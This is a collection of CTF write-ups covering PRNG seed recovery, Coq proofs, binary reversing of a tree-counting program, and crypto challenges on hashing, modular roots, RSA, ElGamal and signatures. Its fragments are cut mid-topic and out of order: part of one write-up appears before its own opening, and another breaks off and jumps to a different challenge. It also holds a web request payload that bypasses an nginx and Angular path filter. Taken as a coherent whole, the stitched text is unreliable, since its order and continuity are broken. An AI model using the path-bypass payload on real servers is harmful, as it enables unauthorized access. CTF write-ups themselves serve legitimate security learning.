static char state[32]; rdata.state = NULL; __initstate_r (random_bits (), state, sizeof (state), \u0026amp;rdata); init = 1; } // omitted... }// include/random-bits.h  static inline uint32_t random_bits (void) { struct timespec tv; __clock_gettime (CLOCK_MONOTONIC, \u0026amp;tv); /* Shuffle the lower bits to minimize the clock bias. */ uint32_t ret = tv.tv_nsec ^ tv.tv_sec; ret ^= (ret \u0026lt;\u0026lt; 24) | (ret \u0026gt;\u0026gt; 8); return ret; } Although the string is fried in the same way, the seed is changed! Since the seed is 32 bits long, maybe I can just exhaust it. However it takes 5 seconds to strfry a 257-byte long string for 0x140000 times, it is not feasible to brute force with the challenge implementation. Let's read how random numbers are generated.\n// stdlib/random_r.c  int __initstate_r (unsigned int seed, char *arg_state, size_t n, struct random_data *buf) { // omitted...  int type; if (n \u0026gt;= BREAK_3) type = n \u0026lt; BREAK_4 ? TYPE_3 : TYPE_4; else if (n \u0026lt; BREAK_1) { if (n \u0026lt; BREAK_0) goto fail; type = TYPE_0; } else type = n \u0026lt; BREAK_2 ? TYPE_1 : TYPE_2; int degree = random_poly_info.degrees[type]; int separation = random_poly_info.seps[type]; buf-\u0026gt;rand_type = type; buf-\u0026gt;rand_sep = separation; buf-\u0026gt;rand_deg = degree; int32_t *state = \u0026amp;((int32_t *) arg_state)[1];\t/* First location. */ /* Must set END_PTR before srandom. */ buf-\u0026gt;end_ptr = \u0026amp;state[degree]; buf-\u0026gt;state = state; __srandom_r (seed, buf); state[-1] = TYPE_0; if (type != TYPE_0) state[-1] = (buf-\u0026gt;rptr - state) * MAX_TYPES + type; // omitted... } strfry uses a 32-byte state, which indicates that TYPE_1 PRNG is used. Seven 32-bit unsigned integer is derived from the seed (denote it as s[0], s[1], ..., s[6]) and set the counter c := 0. This is the equivalent Python code.\nclass GlibcRandom: def __init__(self, seed): self.init_state(seed) [self.next() for _ in range(70)] def init_state(self, seed): state = [seed] for i in range(1, 7): h, l = seed // 127773, seed % 127773 seed = (16807 * l - 2836 * h) \u0026amp; 0x7fffffff state.append(seed) self.state = [ state, 0 ] def next(self): s, t = self.state v = (s[(t+3) % 7] + s[t % 7]) \u0026amp; 0xffffffff v \u0026gt;\u0026gt;= 1 s[(t+3) % 7] += s[t % 7] s[(t+3) % 7] \u0026amp;= 0xffffffff self.state = [s, (t + 1) % 7] return v Part III: Fast-forwarding the states Fast-forwarding the PRNG is easy. This is similar on the Team Trees challenge in CONFidence CTF this year. We can skip states with the matrix implementation (and I am able to skip the details for this part, too). After all, 5M seeds can be checked per second. Since we have only 15 seconds to recover the seed, we are unable to find the entire search space (only 1.75% of the seed space is checked). In average, we can recover the seed from the strfry output in 15 seconds once every 60 times. Finally, if we are able to recover the seed, we can freely fry and unfry strings.\nAfter two hours, we have the flag: DrgnS{Fr13d_57r1Ng5_4r3_tH3_Be5t_s7r1NgS!}.\nbabykok (Misc, 215 points) Solved by GeoffreyY.\nWe simply have to solve some theorems using Coq.\nGood thing I have written some lean before, so learning / writing Coq isn't that difficult.\nFor the first part we have to solve the following 6 theorems in some random order.\nI'd like to thank my teammate @ozetta for finding this powerful coq tactic intuition, and @harrier_lcc for showing us his coq and how to use it.\nThis would\u0026rsquo;ve taken a lot longer if we didn\u0026rsquo;t watch him livestreaming playing around with his coq.

In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So /debug/answer/../.. will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in server.ts, use d%65bug instead of debug. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload: GET /d%65bug/answer//../../a HTTP/1.1\nbfnote (Web, 320 points) Solved by harrier and Ozetta.\nDuring the CTF, cure53 has attempted to patch a mXSS.

We now have source codes to read!\nIn particular we have this function:\npublic static bool Func4(string flag) { ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 }; byte[] bytes = Encoding.ASCII.GetBytes(flag); int length = flag.Length; if ((length \u0026amp; 3) != 0) { Array.Resize\u0026lt;byte\u0026gt;(ref bytes, length + (4 - (length \u0026amp; 3))); } for (int i = length; i \u0026lt; bytes.Length; i++) { bytes[i] = 0; } if (bytes.Length != Check.equations_arr.GetLength(0) * 4) { return false; } object lockObj = new object(); ConcurrentBag\u0026lt;bool\u0026gt; checkResults = new ConcurrentBag\u0026lt;bool\u0026gt;(); List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt; list = new List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(); for (int j = 0; j \u0026lt; Check.equations_arr.GetLength(0); j++) { List\u0026lt;uint\u0026gt; list2 = new List\u0026lt;uint\u0026gt;(); list2.Add(BitConverter.ToUInt32(bytes, j * 4)); for (int k = 0; k \u0026lt; Check.equations_arr.GetLength(1); k++) { list2.Add(Check.equations_arr[j, k]); } list.Add(list2); } Parallel.ForEach\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(list, parallelOptions, delegate(List\u0026lt;uint\u0026gt; equation) { object lockObj = lockObj; lock (lockObj) { uint num = Check.Func3(); for (int l = 0; l \u0026lt; 10000; l++) { num = Check.Func2(equation, num, equation.Count - 2); } checkResults.Add(num == equation[equation.Count - 1]); } }); return Enumerable.All\u0026lt;bool\u0026gt;(checkResults.ToArray(), (bool x) =\u0026gt; x); } Additionally, we have a equations_arr which is a $22\\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 232):\nFirst we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.\nWhat's $n$? It is the output of Check.Func3() and it actually is a random number... Is it even solvable?\n Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (a bit means few sheets of paper and a lot of time), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.\nAfter all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:\nTWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry} easy-hash (Crypto, 75 points) Solved by Mystiz.\nThe challenge defines a new hash algorithm, easy_hash. It is defined by the following function:\ndef easy_hash(x): m = 0 for i in range(len(x) - 3): m += struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, x[i:i + 4])[0] m = m \u0026amp; 0xffffffff return m The objective is to find a collision pair: for twctf: please give me the flag of 2020\nMathematically, if $M=m_1m_2m_3\\dots m_n$, then\n\\[\\text{easy\\_hash}(M):=\\sum_{i=1}^{n-3}\\left(\\text{0x100}^3m_{i+3}+\\text{0x100}^2m_{i+2}+\\text{0x100}m_{i+1}+m_i\\right).\\]\nEquivalently it would be\n\\[ \\begin{aligned} \\text{easy\\_hash}(M) := m_1\u0026 + \\text{0x101} m_2 + \\text{0x10101} m_3 + \\text{0x1010101}\\sum_{i=4}^{n-3}m_i \\\\ \\end{aligned} \\]\nHence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that \u0026quot;f\u0026quot; = \u0026quot;F\u0026quot; + \u0026quot; \u0026quot;, we can simply replace flag into F lag.\n$ curl \u0026#34;https://crypto01.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#34;twctf: please give me the F lag of 2020\u0026#34; # Congrats! The flag is TWCTF{colorfully_decorated_dream} sqrt (Crypto, 216 points) Solved by Mystiz.\nIn this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \\equiv m^{2^{64}}\\ (\\text{mod}\\ p)$ - and the objective is of course to recover the flag $m$.\nMy first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.\nFortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \\equiv 1\\ (\\text{mod}\\ p-1)$. Then $c^d \\equiv m^{d\\cdot 2^{64}}\\equiv m^{2^{30}}\\ (\\text{mod}\\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.\nInstead we compute a 230-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \\equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}.\ntwin-d (Crypto, 172 points) Solved by harrier and Mystiz.\nThis is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,\n\\[ \\begin{cases}\\begin{aligned} e_2 (d+2) \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\\\ e_1 d \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\end{aligned}\\end{cases}. \\]\nharrier has observed that $e_2d \\equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:\n\\[0 \\equiv e_1(e_2d) - e_2(e_1d) \\equiv e_1(1-2e_2)-e_2 \\equiv e_1 - e_2 - 2e_1e_2\\ \\left(\\text{mod}\\ \\phi(n)\\right).\\]\nIn this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \\equiv 1 \\ \\left(\\text{mod}\\ \\phi(n)\\right)$. Hence it suffices to recover the flag from the ciphertext - TWCTF{even_if_it_is_f4+e}.\nThe Melancholy of Alice (Crypto, 242 points) Solved by Mystiz.\nIn this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.\nN = 1024 def generateKey(): p = getStrongPrime(N) q = (p - 1) // 2 x = getRandomRange(2, q) g = 2 h = pow(g, x, p) pk = (p, q, g, h) sk = x return (pk, sk) def encrypt(m, pk): (p, q, g, h) = pk r = getRandomRange(2, q) c1 = pow(g, r, p) c2 = m * pow(h, r, p) % p return (c1, c2) Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?\nWithout any clues, we were messing around. Eventually we tried to factorize $p-1$.\n  Wait what? Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be safe but not strong.\nOkay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.\n# p, q, g, h are redacted to save up some spaces with open(\u0026#39;challenge/ciphertext.txt\u0026#39;) as f: cs = list(map(eval, f.read().strip().split(\u0026#39;\\n\u0026#39;))) r = 5710354319 assert (p-1) % r == 0 x = dlog.bsgs(pow(g, (p-1)//r, p), pow(h, (p-1)//r, p), p, r) assert pow(g, x * (p-1)//r, p) == pow(h, (p-1)//r, p) ms = b\u0026#39;\u0026#39; m_map = list(map(lambda m: pow(m, (p-1)//r, p), range(0x20, 0x80))) print(m_map) for c1, c2 in cs: c1 = pow(c1, (p-1)//r, p) c2 = pow(c2, (p-1)//r, p) m = c2 * powmod(c1, -x, p) % p assert m in m_map ms += bytes([m_map.index(m) + 0x20]) print(ms) XOR and shift encryptor (Crypto, 303 points) Solved by Mystiz.\nThis is more like a PPC challenge instead of a cryptography challenge. There is a randgen function, that serves as the core of the challenge, defined below:\ndef randgen(): global s,p a = 3 b = 13 c = 37 s0 = s[p] p = (p + 1) \u0026amp; 63 s1 = s[p] res = (s0 + s1) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s1 ^= (s1 \u0026lt;\u0026lt; a) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s[p] = (s1 ^ s0 ^ (s1 \u0026gt;\u0026gt; b) ^ (s0 \u0026gt;\u0026gt; c)) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) return res They are utilizing the \u0026quot;inefficiency\u0026quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2100). Of course the naive approach doesn't work - you will wait forever.\nHowever, if we are only considering the state transition (i.e., how s is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.\nWe can write transitions under the definition (note that the $+$ operation is actually operated under $\\text{GF}(2)$, i.e., it is a XOR):\n $s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$, $s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$, ...  Hence, we can define a $64^2\\times64^2$ transition matrix $T$ over $\\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.\nHelp. I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn\u0026rsquo;t it be $O(m^{2.3737}\\cdot\\log n)$ to compute $M^n$ for a $m\\times m$ matrix?).  Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: FAKEFLAG{THIS_IS_FAKE_FLAG}.\nOops, nope.

It is verifying a signature in the following way:\n\\[x^2 + ky^2 \\equiv \\text{hash}(msg)\\ (\\text{mod}\\ n).\\]\nIn particular, you can get the flag when the signature is correct and msg == 'SUNSHINE RHYTHM'. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \\equiv m\\ (\\text{mod}\\ n)$. This is a simplified version of OSS schemes.\nI was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing and came across to Pollard's algorithm (From An Efficient Solution of the Congruence x2 + ky2 = m (mod n) by Pollard and Schnorr). Moreover, the algorithm is described very clearly in An Exposition of Pollard's Algorithm for Quadratic Congruences by Shallit. I have an implementation of Pollard's algorithm following their procedures.\nSupplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the verify endpoint would give us the flag - TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}.\nBirds (Misc, 41 points) Solved by cire meat pop and Mystiz.\nNothing much is given from the challenge description, there are a multiple lines /^[A-Z]{2}[0-9]{3,4}$/'s.\nBC552 AC849 JL106 PQ448 JL901 LH908 NH2177 After a bit of Googling, those are flight numbers.

It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow...\n We are given a binary that executes a slow algorithm that takes up a lot of memory. The objective is to wait the program until it is done - the flag would be shown as the output.\n Never. Our PCs don't even have enough memory to play with that. Even so, we gotta wait forever for the flag. Our objective is to optimize and rewrite the algorithm used. By optimize we mean reduce both the time and space complexities.\nSolution Part I: Baby steps from baby cases From the binary, we knew that we are going to find $f(1337)$ for a given $f$. Although we do not know what $f$ is, we could still have an insight on it. For example, we can patch 1337 by smaller values: 0, 1, etc.:\nn = 0: p4{32b9b6bca55548ed88ec405c5c7cf3a1} n = 1: p4{ee5fadd5a727857f32b9b6bca55548ed} n = 2: p4{ee5fadd5a727857f982d2435efffdac7} n = 3: p4{c8b5922a9f156985b4f8094372145c13} ... n = 4: Out of memory ;_; In particular, 32b9b6bca55548ed in the output for $n = 0$ is the v1 in sub_400816:\nvoid __noreturn sub_400816() { unsigned __int64 v0; // rdx  signed __int64 v1; // rcx  signed __int64 v2; // rt0  v0 = 0x82F96AC97429A68BLL; v1 = 0x32B9B6BCA55548EDLL; __debugbreak(); while ( 1 ) { v2 = v1; v1 = 3 * v0 + 2 * v1 + 4; v0 = v2; } } But what is 88ec405c5c7cf3a1? It must be related to v0 and v1. We tried 3*v0 + 2*v1 + 4 and it is ee5fadd5a727857f. It does not check out.\nWe have spot out that the output shares the same prefix when $n=1$ and $n=2$. Maybe we shall see what is going on with sub_400816 - it is simply generating numbers for a sequence, namely $s_n$, indefinitely:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  Let's generate a bunch of $a_k$'s to see if there is something interesting:\ns_2 = 0xee5fadd5a727857f s_3 = 0x74ec7fe13e4ee5c9 s_4 = 0xb4f8094372145c13 s_5 = 0xc8b5922a9f156985 ... If we rewrite the program output in terms of $s_k$, we have:\nn = 0: p4{s_1 88ec405c5c7cf3a1} n = 1: p4{s_2 32b9b6bca55548ed} n = 2: p4{s_2 982d2435efffdac7} n = 3: p4{s_5 s_4} The output when $n = 3$ is actually composed by two elements in the sequence. It makes us think: is it the case that 88ec... (also 32b9... and 982d...) is an intermediate state? To verify our thoughts, we are going to dig deeper into the assembly operations.\n There are four operations. Here are the values of v0 and v1 (as defined in sub_400816) after each of the steps.\n/* rcx = c0, rdx = d0 */ lea rdx, [rdx+rdx*2] /* rcx = c0, rdx = 3*d0 */ lea rdx, [rdx+rcx*2+4] /* rcx = c0, rdx = 3*d0 + 2*c0 + 4 */ xchg rcx, rdx /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ jmp short loc_40082F /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ With that said, it takes four instructions for a complete cycle inside while.

And what is the attribute it is checked against?\nPart II: Collecting the pieces for the puzzle There are four functions that worth investigating: sub_40090D (the enumerator), sub_4009C4 (the checker), sub_400A59 (the constructor) and sub_400840 (called from sub_40090D). We will first look into sub_400840:\n_DWORD *__fastcall sub_400840(_DWORD *a1) { int i; // [rsp+14h] [rbp-Ch]  _DWORD *v3; // [rsp+18h] [rbp-8h]  v3 = malloc(0x20uLL); if ( !v3 ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *v3 = *a1; for ( i = 0; *a1 \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;v3[2 * i + 2] = sub_400840(*(_QWORD *)\u0026amp;a1[2 * i + 2]); return v3; } Since it is allocating 32 bytes, we can define a dummy struct:\nstruct Dummy { char x[32]; }; Loading the struct into IDA, by redefining the types of a1 and v3 as Dummy*, we have:\nDummy *__fastcall sub_400840(Dummy *src) { int i; // [rsp+14h] [rbp-Ch]  Dummy *dest; // [rsp+18h] [rbp-8h]  dest = (Dummy *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *(_DWORD *)dest-\u0026gt;x = *(_DWORD *)src-\u0026gt;x; for ( i = 0; *(_DWORD *)src-\u0026gt;x \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;dest-\u0026gt;x[8 * i + 8] = sub_400840(*(Dummy **)\u0026amp;src-\u0026gt;x[8 * i + 8]); return dest; } It is calling itself recursively. Would it be a deep clone? Moreover, we can further see that the first four bytes should be size and it would not be greater than 3. Otherwise 8*i+8 \u0026gt;= 32, overflowing the struct. After all, we think it is a node of the tree - and this is the final struct we have:\nstruct Node { int size; char x[4]; // unknown  Node *child[3]; }; More importantly, we can finally claim that sub_400840 is fully reversed.\nNode *__fastcall clone(Node *src) { int i; // [rsp+14h] [rbp-Ch]  Node *dest; // [rsp+18h] [rbp-8h]  dest = (Node *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } dest-\u0026gt;size = src-\u0026gt;size; for ( i = 0; src-\u0026gt;size \u0026gt; i; ++i ) dest-\u0026gt;child[i] = clone(src-\u0026gt;child[i]); return dest; } Then we will be reversing sub_400A59. This function is simple, it is defining a path with length $n$. After the tree is constructed, it will be used by sub_400BED for enumeration. How? Let's see a baby example when $n = 2$:\ndigraph { t0_0[shape=point] t0_1[shape=point] t0_2[shape=point] t0_0 -\u0026gt; t0_1 [arrowhead=false] t0_1 -\u0026gt; t0_2 [arrowhead=false] x0[shape=point,style=invis] y0[shape=point,style=invis] x0-\u0026gt;y0 t1_0[shape=point] t1_1[shape=point] t1_2[shape=point] t1_3[shape=point] t1_0 -\u0026gt; t1_1 [arrowhead=false] t1_1 -\u0026gt; t1_2 [arrowhead=false] t1_1 -\u0026gt; t1_3 [arrowhead=false] x1[shape=point,style=invis] y1[shape=point,style=invis] x1-\u0026gt;y1 t2_0[shape=point] t2_1[shape=point] t2_2[shape=point] t2_3[shape=point] t2_4[shape=point] t2_0 -\u0026gt; t2_1 [arrowhead=false] t2_1 -\u0026gt; t2_2 [arrowhead=false] t2_1 -\u0026gt; t2_3 [arrowhead=false] t2_1 -\u0026gt; t2_4 [arrowhead=false] x2[shape=point,style=invis] y2[shape=point,style=invis] x2-\u0026gt;y2 t3_0[shape=point] t3_1[shape=point] t3_2[shape=point] t3_3[shape=point] t3_4[shape=point] t3_0 -\u0026gt; t3_1 [arrowhead=false] t3_0 -\u0026gt; t3_3 [arrowhead=false] t3_1 -\u0026gt; t3_2 [arrowhead=false] t3_3 -\u0026gt; t3_4 [arrowhead=false] x3[shape=point,style=invis] y3[shape=point,style=invis] x3-\u0026gt;y3 t4_0[shape=point] t4_1[shape=point] t4_2[shape=point] t4_3[shape=point] t4_4[shape=point] t4_5[shape=point] t4_0 -\u0026gt; t4_1 [arrowhead=false] t4_0 -\u0026gt; t4_3 [arrowhead=false] t4_1 -\u0026gt; t4_2 [arrowhead=false] t4_3 -\u0026gt; t4_4 [arrowhead=false] t4_3 -\u0026gt; t4_5 [arrowhead=false] x4[shape=point,style=invis] y4[shape=point,style=invis] x4-\u0026gt;y4 u[label=\u0026#34;...\u0026#34;, shape=plaintext] x5[shape=point,style=invis] y5[shape=point,style=invis] x5-\u0026gt;y5 t5_0[shape=point] t5_1[shape=point] t5_2[shape=point] t5_3[shape=point] t5_4[shape=point] t5_5[shape=point] t5_6[shape=point] t5_7[shape=point] t5_8[shape=point] t5_9[shape=point] t5_10[shape=point] t5_11[shape=point] t5_12[shape=point] t5_0 -\u0026gt; t5_1 [arrowhead=false] t5_0 -\u0026gt; t5_2 [arrowhead=false] t5_0 -\u0026gt; t5_3 [arrowhead=false] t5_1 -\u0026gt; t5_4 [arrowhead=false] t5_1 -\u0026gt; t5_5 [arrowhead=false] t5_1 -\u0026gt; t5_6 [arrowhead=false] t5_2 -\u0026gt; t5_7 [arrowhead=false] t5_2 -\u0026gt; t5_8 [arrowhead=false] t5_2 -\u0026gt; t5_9 [arrowhead=false] t5_3 -\u0026gt; t5_10 [arrowhead=false] t5_3 -\u0026gt; t5_11 [arrowhead=false] t5_3 -\u0026gt; t5_12 [arrowhead=false] {rank=same; t0_1; u; x0; y0; x1; y1; x2; y2; x3; y3; x4; y4; x5; y5} } Well... it is just enumerating all the ternary trees with depth $n$, where each of the leaf node is on level $n$.\nAfter that, we check the number of good trees. By good it is defined by (former) sub_4009C4:\nsigned __int64 __fastcall is_good_tree(Node *node, int k) { int ka; // [rsp+4h] [rbp-1Ch]  int kb; // [rsp+4h] [rbp-1Ch]  int i; // [rsp+1Ch] [rbp-4h]  ka = k; if ( node-\u0026gt;size \u0026gt; 1 \u0026amp;\u0026amp; k ) return 0LL; if ( node-\u0026gt;size \u0026gt; k ) ka = node-\u0026gt;size; kb = ka - 1; if ( kb \u0026lt; 0 ) kb = 0; for ( i = 0; node-\u0026gt;size \u0026gt; i; ++i ) { if ( (unsigned __int8)is_good_tree(node-\u0026gt;child[i], kb) != 1 ) return 0LL; } return 1LL; } harrier has implemented a good tree checker (himself) in Discord for me to test with:\n After all, a tree is said to be good if both of the condition are satisfied:\n for each node with two children, every children should have at most one children, and for each node with three children, every children and their grandchildren should have at most one children.  Cool. We have the pieces of the puzzle gathered. Define $g(n)$ to be the number of good trees of depth $n$. We are going to find $g(1337)$ and move the sequence forward by $g(1337)$ instructions.\nPart III: Verifying this for the baby cases We are double checking if our observation checks out for smaller $n$'s. From above, $g(0) = 1$, $g(1) = 3\\ \\text{or}\\ 4$, $g(2) = 5$ and $g(3) = 15\\ \\text{or}\\ 16$.\nFor $n = 0$, the only tree would be:\ndigraph { node[shape=point] edge[arrowhead=false] t0 } Yeah. It is a good tree. Thus $g(0) = 1$. Also, $g(1) = 3$ since the three trees are all good:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 } For $n = 2$, we start rejecting trees. There are 39 trees, but there are only five being good. Hence $g(2) = 5$.\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 } And $g(3) = 15$. They are:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t0_2 -\u0026gt; t0_3 t5_0 -\u0026gt; t5_1 t5_1 -\u0026gt; t5_2 t5_2 -\u0026gt; t5_3 t5_2 -\u0026gt; t5_4 t6_0 -\u0026gt; t6_1 t6_1 -\u0026gt; t6_2 t6_2 -\u0026gt; t6_3 t6_2 -\u0026gt; t6_4 t6_2 -\u0026gt; t6_5 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t3_2 -\u0026gt; t3_4 t3_3 -\u0026gt; t3_5 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t4_2 -\u0026gt; t4_5 t4_3 -\u0026gt; t4_6 t4_4 -\u0026gt; t4_7 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t1_3 -\u0026gt; t1_5 t1_4 -\u0026gt; t1_6 t7_0 -\u0026gt; t7_1 t7_0 -\u0026gt; t7_2 t7_1 -\u0026gt; t7_3 t7_2 -\u0026gt; t7_4 t7_3 -\u0026gt; t7_5 t7_4 -\u0026gt; t7_6 t7_4 -\u0026gt; t7_7 t8_0 -\u0026gt; t8_1 t8_0 -\u0026gt; t8_2 t8_1 -\u0026gt; t8_3 t8_2 -\u0026gt; t8_4 t8_3 -\u0026gt; t8_5 t8_4 -\u0026gt; t8_6 t8_4 -\u0026gt; t8_7 t8_4 -\u0026gt; t8_8 t9_0 -\u0026gt; t9_1 t9_0 -\u0026gt; t9_2 t9_1 -\u0026gt; t9_3 t9_2 -\u0026gt; t9_4 t9_3 -\u0026gt; t9_5 t9_3 -\u0026gt; t9_6 t9_4 -\u0026gt; t9_7 }digraph { node[shape=point] edge[arrowhead=false] t10_0 -\u0026gt; t10_1 t10_0 -\u0026gt; t10_2 t10_1 -\u0026gt; t10_3 t10_2 -\u0026gt; t10_4 t10_3 -\u0026gt; t10_5 t10_3 -\u0026gt; t10_6 t10_4 -\u0026gt; t10_7 t10_4 -\u0026gt; t10_8 t11_0 -\u0026gt; t11_1 t11_0 -\u0026gt; t11_2 t11_1 -\u0026gt; t11_3 t11_2 -\u0026gt; t11_4 t11_3 -\u0026gt; t11_5 t11_3 -\u0026gt; t11_6 t11_4 -\u0026gt; t11_7 t11_4 -\u0026gt; t11_8 t11_4 -\u0026gt; t11_9 t12_0 -\u0026gt; t12_1 t12_0 -\u0026gt; t12_2 t12_1 -\u0026gt; t12_3 t12_2 -\u0026gt; t12_4 t12_3 -\u0026gt; t12_5 t12_3 -\u0026gt; t12_6 t12_3 -\u0026gt; t12_7 t12_4 -\u0026gt; t12_8 t13_0 -\u0026gt; t13_1 t13_0 -\u0026gt; t13_2 t13_1 -\u0026gt; t13_3 t13_2 -\u0026gt; t13_4 t13_3 -\u0026gt; t13_5 t13_3 -\u0026gt; t13_6 t13_3 -\u0026gt; t13_7 t13_4 -\u0026gt; t13_8 t13_4 -\u0026gt; t13_9 t14_0 -\u0026gt; t14_1 t14_0 -\u0026gt; t14_2 t14_1 -\u0026gt; t14_3 t14_2 -\u0026gt; t14_4 t14_3 -\u0026gt; t14_5 t14_3 -\u0026gt; t14_6 t14_3 -\u0026gt; t14_7 t14_4 -\u0026gt; t14_8 t14_4 -\u0026gt; t14_9 t14_4 -\u0026gt; t14_10 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 t2_4 -\u0026gt; t2_7 t2_5 -\u0026gt; t2_8 t2_6 -\u0026gt; t2_9 } Cool! Everything checks out! Luckily the memory overflows when 